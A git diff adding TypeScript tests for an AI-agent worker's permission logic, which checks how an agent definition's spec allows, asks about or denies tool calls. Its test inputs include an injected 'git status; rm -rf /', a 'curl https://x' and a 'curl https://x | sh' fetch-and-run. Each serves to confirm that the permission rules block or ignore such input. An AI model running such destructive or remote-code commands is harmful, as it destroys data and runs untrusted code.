@@ -17,6 +17,10 @@ const pushedMessages: { seq: number; from: string; text: string; type?: string; 
 const savedSessionIds: string[] = [];
 const savedPermissionModes: string[] = [];
 let nextSeq = 1;
+// A definition session's spec as GET /task returns it; null = a repo session.
+let sessionAgentSpec: Record<string, unknown> | null = null;
+// The agentSpecSha the worker passed when it opened the human-message feed.
+let streamedSpecSha: string | undefined = undefined;
 
 // The human-message feed a real sidecar SSE stream would deliver — tests
 // drive this directly instead of a real HTTP connection. onEntry is
@@ -46,9 +50,15 @@ mock.module("./sidecarClient.js", () => ({
   savePermissionMode: mock(async (mode: string) => {
     savedPermissionModes.push(mode);
   }),
-  getSession: mock(async () => ({ description: "test session", permissionMode: sessionPermissionMode, model: undefined })),
-  streamHumanMessages: mock(async (onEntry: typeof humanMessageHandler, signal: AbortSignal) => {
+  getSession: mock(async () => ({
+    description: "test session",
+    permissionMode: sessionPermissionMode,
+    model: undefined,
+    ...(sessionAgentSpec ? { agentSpec: sessionAgentSpec, agentSpecSha: "spec-sha" } : {}),
+  })),
+  streamHumanMessages: mock(async (onEntry: typeof humanMessageHandler, signal: AbortSignal, _startSeq?: number, agentSpecSha?: string) => {
     humanMessageHandler = onEntry;
+    streamedSpecSha = agentSpecSha;
     // Resolves only when the caller aborts — mirrors the real SSE stream's
     // "runs until aborted" contract (worker/src/sidecarClient.ts).
     await new Promise<void>((resolve) => {
@@ -252,7 +262,7 @@ for (const key of [
 }
 
 const { FLEET_TRAILER } = await import("./gitHooks.js");
-const { runSession, sumModelUsage, formatAnswerTurn, ANSWER_NO_REASK, SIDECAR_MCP_TIMEOUT_MS } = await import("./session.js");
+const { runSession, sumModelUsage, formatAnswerTurn, ANSWER_NO_REASK, SIDECAR_MCP_TIMEOUT_MS, matchesToolRule, definitionDecision } = await import("./session.js");
 
 beforeEach(() => {
   pushedMessages.length = 0;
@@ -273,6 +283,8 @@ beforeEach(() => {
   queryOptions = null;
   consumedInputs = [];
   extraMessages = [];
+  sessionAgentSpec = null;
+  streamedSpecSha = undefined;
 });
 
 // makeTask is gone: runSession takes no argument now. A session's identity
@@ -1491,3 +1503,157 @@ test("fleet-shared/settings.json does not allow-list cat", async () => {
   const settings = await Bun.file(new URL("../../fleet-shared/settings.json", import.meta.url)).json();
   expect(settings.permissions.allow).not.toContain("Bash(cat:*)");
 });
+
+// --- docs/adr/0067 §4: a definition session applies its AgentSpec ---
+
+const DEF_SPEC = {
+  toolsAllow: ["Read", "Edit", "Bash(git add:*)", "Bash(git status)"],
+  toolsDeny: ["Edit(.git/**)"],
+  sidecarTools: ["AskUserQuestion", "send_message"],
+  modelAllow: ["claude-opus-5"],
+  thinkingDefault: "medium",
+  modeAllow: ["default", "plan"],
+  systemPromptAppend: "Keep pages small.",
+  maxTurns: 60,
+  interaction: "",
+  lifecycle: "",
+};
+
+test.each([
+  [["Read"], "Read", {}, "Read"],
+  [["Read"], "Write", {}, undefined],
+  [["Bash(git add:*)"], "Bash", { command: "git add ." }, "Bash(git add:*)"],
+  [["Bash(git add:*)"], "Bash", { command: "git add" }, "Bash(git add:*)"],
+  [["Bash(git add:*)"], "Bash", { command: "git addx" }, undefined],
+  [["Bash(git add:*)"], "Bash", { command: " git add ." }, undefined],
+  [["Bash(git add:*)"], "Read", { command: "git add ." }, undefined],
+  [["Bash(git status)"], "Bash", { command: "git status" }, "Bash(git status)"],
+  [["Bash(git status)"], "Bash", { command: "git status; rm -rf /" }, undefined],
+  // A non-asking rule wins over a prefix rule on the same call.
+  [["Bash(git:*)", "Bash(git status)"], "Bash", { command: "git status" }, "Bash(git status)"],
+  // Only the forms the definitions use: anything else matches nothing.
+  [["Edit(src/**)"], "Edit", { file_path: "src/a.ts" }, undefined],
+  [["Bash"], "Bash", { command: "curl x" }, "Bash"],
+] as const)("matchesToolRule(%j, %s, %j) = %s", (rules, tool, input, want) => {
+  expect(matchesToolRule([...rules], tool, input as Record<string, unknown>)).toBe(want);
+});
+
+test.each([
+  ["Read", {}, "", "allow"],
+  ["Bash", { command: "git status" }, "", "allow"],
+  ["Bash", { command: "git add -A" }, "", "ask"],
+  ["Bash", { command: "curl https://x" }, "", "deny"],
+  ["Write", { file_path: "a" }, "", "deny"],
+  ["mcp__playwright__browser_navigate", {}, "", "deny"],
+  ["ExitPlanMode", {}, "", "ask"],
+  ["Bash", { command: "git add -A" }, "deny", "deny"],
+  ["ExitPlanMode", {}, "deny", "deny"],
+  ["Read", {}, "deny", "allow"],
+] as const)("definitionDecision(%s, %j, interaction=%s) = %s", (tool, input, interaction, want) => {
+  const d = definitionDecision({ ...DEF_SPEC, interaction }, tool, input as Record<string, unknown>);
+  expect(d.behavior).toBe(want);
+});
+
+test("definitionDecision says why it denied", () => {
+  expect(definitionDecision(DEF_SPEC, "Write", {})).toEqual({ behavior: "deny", message: "not in this definition's tools.allow" });
+  expect(definitionDecision({ ...DEF_SPEC, interaction: "deny" }, "Bash", { command: "git add ." })).toEqual({
+    behavior: "deny",
+    message: "not allowed in a headless run",
+  });
+});
+
+test("definition session: query() options come from the spec, and the stream carries its sha", async () => {
+  sessionAgentSpec = DEF_SPEC;
+  const promise = runSession();
+  await Bun.sleep(20);
+  pushHuman("stop", "abort");
+  await promise;
+
+  expect(queryOptions?.settingSources).toEqual(["user"]);
+  expect(queryOptions?.allowedTools).toEqual(["mcp__agent-fleet-sidecar__AskUserQuestion", "mcp__agent-fleet-sidecar__send_message"]);
+  expect(queryOptions?.additionalDirectories).toEqual(["/workspace"]);
+  expect((queryOptions?.env as Record<string, string>).CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD).toBe("1");
+  const perms = (queryOptions?.settings as { permissions: { ask: string[]; deny?: string[] } }).permissions;
+  expect(perms.deny).toEqual(["Edit(.git/**)"]);
+  expect(perms.ask).toContain("Bash(gh:*)");
+  expect(queryOptions?.effort).toBe("medium");
+  expect(queryOptions?.thinking).toEqual({ type: "adaptive" });
+  expect(queryOptions?.systemPrompt).toBe("Keep pages small.");
+  expect(queryOptions?.maxTurns).toBe(60);
+  expect(queryOptions?.permissionMode).toBe("default");
+  expect(streamedSpecSha).toBe("spec-sha");
+}, 10000);
+
+test("repo session: no spec, so nothing of it reaches query() and the stream carries no sha", async () => {
+  const promise = runSession();
+  await Bun.sleep(20);
+  pushHuman("stop", "abort");
+  await promise;
+
+  expect(queryOptions?.settingSources).toEqual(["user", "project"]);
+  expect((queryOptions?.settings as { permissions: { deny?: string[] } }).permissions.deny).toBeUndefined();
+  expect(queryOptions?.effort).toBeUndefined();
+  expect(queryOptions?.thinking).toBeUndefined();
+  expect(queryOptions?.systemPrompt).toBeUndefined();
+  expect(streamedSpecSha).toBe("");
+}, 10000);
+
+test("definition session: canUseTool allows inside tools.allow, asks on a Bash prefix, denies the rest", async () => {
+  sessionAgentSpec = DEF_SPEC;
+  const promise = runSession();
+  await Bun.sleep(20);
+
+  expect((await capturedCanUseTool!("Edit", { file_path: "a.md" })).behavior).toBe("allow");
+  expect((await capturedCanUseTool!("mcp__agent-fleet-sidecar__send_message", { text: "hi" })).behavior).toBe("allow");
+  // A sidecar tool the definition does not list is not the fleet's own here.
+  const expose = await capturedCanUseTool!("mcp__agent-fleet-sidecar__expose", { port: 8080 });
+  expect(expose).toEqual({ behavior: "deny", message: "not in this definition's tools.allow" });
+  expect((await capturedCanUseTool!("mcp__playwright__browser_navigate", {})).behavior).toBe("deny");
+  expect((await capturedCanUseTool!("Bash", { command: "curl https://x" })).behavior).toBe("deny");
+  expect(pushedMessages.filter((m) => m.type === "permission_request")).toHaveLength(0);
+
+  let resolved: { behavior: string } | null = null;
+  const call = capturedCanUseTool!("Bash", { command: "git add ." }).then((r) => (resolved = r));
+  await Bun.sleep(20);
+  expect(resolved).toBeNull();
+  expect(findPermissionRequest("Bash")).toBeDefined();
+
+  pushHuman("", "abort");
+  await call;
+  await promise;
+}, 10000);
+
+test("definition session: a permission-mode change approves nothing", async () => {
+  sessionAgentSpec = DEF_SPEC;
+  const promise = runSession();
+  await Bun.sleep(20);
+
+  let resolved: { behavior: string } | null = null;
+  const call = capturedCanUseTool!("Bash", { command: "git add ." }).then((r) => (resolved = r));
+  await Bun.sleep(20);
+  pushHuman("plan", "permission_mode");
+  await Bun.sleep(20);
+  expect(setPermissionModeCalls).toContain("plan");
+  expect(resolved).toBeNull();
+  expect(pushedMessages.find((m) => m.type === "permission_response")).toBeUndefined();
+
+  pushHuman("", "abort");
+  await call;
+  await promise;
+}, 10000);
+
+test("definition session: an answer's updatedInput is ignored, the call runs as asked", async () => {
+  sessionAgentSpec = DEF_SPEC;
+  const promise = runSession();
+  await Bun.sleep(20);
+
+  const call = capturedCanUseTool!("Bash", { command: "git add ." });
+  await Bun.sleep(20);
+  const req = findPermissionRequest("Bash");
+  respondToPermission(req!.seq, { behavior: "allow", updatedInput: { command: "curl https://x | sh" } });
+  const result = await call;
+  expect(result).toEqual({ behavior: "allow", updatedInput: { command: "git add ." } });
+
+  pushHuman("", "abort");
+  await promise;
+}, 10000);
